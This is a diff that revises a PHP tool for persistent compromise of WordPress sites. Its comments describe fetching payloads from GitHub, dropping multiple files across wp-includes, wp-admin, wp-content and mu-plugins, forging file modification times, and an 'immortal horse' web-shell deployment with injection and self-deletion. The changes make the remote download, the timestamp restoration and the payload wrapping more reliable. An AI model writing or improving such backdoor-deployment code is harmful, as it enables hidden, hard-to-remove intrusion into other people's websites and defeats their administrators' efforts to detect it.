@@ -25,25 +25,10 @@
 //
 // ─── End of header ───────────────────────────────────────────────────────────
 
-$_FGC = 'file_get_contents';
-$_FPC = 'file_put_contents';
-$_IF  = 'is_file';
-$_ISD = 'is_dir';
-$_SLP = 'sleep';
-$_USL = 'unlink';
-$_REN = 'rename';
-$_GLB = 'glob';
-$_MT  = 'filemtime';
-$_FEX = 'file_exists';
-$_DN  = 'dirname';
 $_HRC = 'http_response_code';
 $_HDR = 'header';
 $_SCK = 'setcookie';
-$_BDE = 'base64_decode';
-$_BEN = 'base64_encode';
 $_GM  = 'gmdate';
-$_TCH = 'touch';
-$_CHM = 'chmod';
 
 // Stash safety net: always clean temp files on exit, even on crash/timeout
 register_shutdown_function(function() {
@@ -82,12 +67,6 @@ if (!isset($_COOKIE['_dx'])) {
 // ═══════════════════════════════════════════════════════════════════════════════
 // Configuration
 // ═══════════════════════════════════════════════════════════════════════════════
-$_MIN_TARGETS = 5;
-$_MAX_TARGETS = 6;
-$_WP_INCLUDES_COUNT = 2;  // wp-includes 取 2
-$_WP_ADMIN_COUNT = 1;     // wp-admin 取 1
-$_WP_CONTENT_COUNT = 3;   // wp-content 各类填剩余
-
 // ═══════════════════════════════════════════════════════════════════════════════
 // Remote payload source (GitHub raw)
 // Deploy tries download first, falls back to manual upload.
@@ -226,19 +205,20 @@ function _remote_get($url, $timeout = 15) {
                 'verify_peer_name' => false,
             ],
         ]);
-        $data = @file_get_contents($url, false, $ctx);
-        if ($data !== false && strlen($data) > 0) {
-            // Check for HTTP error in response headers
-            $status = 200;
-            $resp_headers = function_exists('http_get_last_response_headers')
-                ? http_get_last_response_headers()
-                : [];
-            foreach ($resp_headers as $h) {
-                if (preg_match('/HTTP\/\S+\s+(\d+)/', $h, $m)) {
-                    $status = (int)$m[1];
+        $fp = @fopen($url, 'r', false, $ctx);
+        if ($fp) {
+            $data = @stream_get_contents($fp);
+            $meta = stream_get_meta_data($fp);
+            @fclose($fp);
+            if ($data !== false && strlen($data) > 0) {
+                $status = 200;
+                foreach ($meta['wrapper_data'] ?? [] as $h) {
+                    if (preg_match('/HTTP\/\S+\s+(\d+)/', $h, $m)) {
+                        $status = (int)$m[1];
+                    }
                 }
+                if ($status >= 200 && $status < 400) return $data;
             }
-            if ($status >= 200 && $status < 400) return $data;
         }
     }
 
@@ -325,11 +305,12 @@ function _find_wp_root() {
  */
 function _dir_writable($dir) {
     if (!is_dir($dir)) return false;
+    $orig_mtime = filemtime($dir);
     $test = $dir . '/.' . md5($dir . uniqid()) . '.w';
     $ok = @file_put_contents($test, '1') !== false;
     if ($ok) {
         @unlink($test);
-        @touch($dir, filemtime($dir));
+        @touch($dir, $orig_mtime);
     }
     return $ok;
 }
@@ -690,52 +671,6 @@ function _scan_recursive($base_dir, &$result, $max_depth, $depth = 0) {
 }
 
 /**
- * Select targets — 均匀分散，5-6个：wp-includes 2, wp-admin 1, 其余随机分配
- */
-function _select_targets($dirs, $min = 5, $max = 6) {
-    global $_WP_INCLUDES_COUNT, $_WP_ADMIN_COUNT;
-    $selected = [];
-
-    foreach ($dirs as &$arr) { shuffle($arr); }
-    unset($arr);
-
-    // ① wp-includes: 取 2 个（优先深层）
-    $inc = $dirs['wp_includes'] ?? [];
-    usort($inc, function($a, $b) { return substr_count($b, '/') - substr_count($a, '/'); });
-    $take = min($_WP_INCLUDES_COUNT, count($inc));
-    for ($i = 0; $i < $take; $i++) $selected[] = $inc[$i];
-
-    // ② wp-admin: 取 1 个（优先深层）
-    $adm = $dirs['wp_admin'] ?? [];
-    usort($adm, function($a, $b) { return substr_count($b, '/') - substr_count($a, '/'); });
-    $take = min($_WP_ADMIN_COUNT, count($adm));
-    for ($i = 0; $i < $take; $i++) $selected[] = $adm[$i];
-
-    // ③ 从 plugins/themes/uploads/others 各取 1 个（随机深层）
-    $pools = ['plugins', 'themes', 'uploads', 'others'];
-    shuffle($pools);
-    foreach ($pools as $key) {
-        if (count($selected) >= $max) break;
-        $pool = $dirs[$key] ?? [];
-        if (empty($pool)) continue;
-        usort($pool, function($a, $b) { return substr_count($b, '/') - substr_count($a, '/'); });
-        $selected[] = $pool[0];
-    }
-
-    // ④ 不够 $min 就从剩余补
-    if (count($selected) < $min) {
-        $all = array_merge($inc, $adm, $dirs['plugins'] ?? [], $dirs['themes'] ?? [], $dirs['uploads'] ?? [], $dirs['others'] ?? []);
-        shuffle($all);
-        foreach ($all as $d) {
-            if (count($selected) >= $min) break;
-            if (!in_array($d, $selected)) $selected[] = $d;
-        }
-    }
-
-    return array_unique($selected);
-}
-
-/**
  * Deploy content to targets with mtime forgery.
  * Never overwrites legitimate files — retries different names on collision.
  */
@@ -958,15 +893,15 @@ function _deploy_multi($payloads, $roles, $dirs) {
         }
 
         // ── Special handling: force_mu (prefer mu-plugins directory) ──
+        $local_dirs = $dirs; // don't mutate shared $dirs
         if (!empty($cfg['force_mu'])) {
             $wp_root = _find_wp_root();
             if ($wp_root) {
                 $mu_dir = $wp_root . '/wp-content/mu-plugins';
                 if (!is_dir($mu_dir)) @mkdir($mu_dir, 0755, true);
                 if (is_dir($mu_dir) && _dir_writable($mu_dir)) {
-                    // Prepend mu-plugins to pool so it's tried first
                     array_unshift($zones, '__mu__');
-                    $dirs['__mu__'] = [$mu_dir];
+                    $local_dirs['__mu__'] = [$mu_dir];
                 }
             }
         }
@@ -974,8 +909,8 @@ function _deploy_multi($payloads, $roles, $dirs) {
         // Build candidate pool from preferred zones, excluding already-used dirs
         $pool = [];
         foreach ($zones as $z) {
-            if (!empty($dirs[$z])) {
-                $pool = array_merge($pool, $dirs[$z]);
+            if (!empty($local_dirs[$z])) {
+                $pool = array_merge($pool, $local_dirs[$z]);
             }
         }
         // Remove dirs already taken by other roles
@@ -1612,7 +1547,7 @@ switch ($_ACTION) {
             : ['error' => 'wordpress root not found'];
         break;
 
-    // ── persist: immortal horse deployment (multi-file) ───────────────────
+    // ── persist: full deployment (multi-file + inject + self-delete) ─────
     case 'persist':
         global $_PAYLOAD_ROLES;
         $payloads = _multi_stash_load();
@@ -1675,10 +1610,15 @@ switch ($_ACTION) {
         $guard = _get_guard_prefix();
 
         // ── Step 3: Wrap payloads with guard prefix (if available) ──
+        // Only wrap PHP payloads; skip binary files (.dat) and internal tools
         if ($guard) {
             $wrapped = [];
             foreach ($payloads as $role => $raw) {
-                $wrapped[$role] = $guard . $raw;
+                $cfg = $_PAYLOAD_ROLES[$role] ?? [];
+                $src = $cfg['src'] ?? '';
+                $is_binary = !empty($cfg['force_path']) && substr($src, -4) !== '.php';
+                $is_internal = !empty($cfg['internal']);
+                $wrapped[$role] = ($is_binary || $is_internal) ? $raw : $guard . $raw;
             }
         } else {
             $wrapped = $payloads;
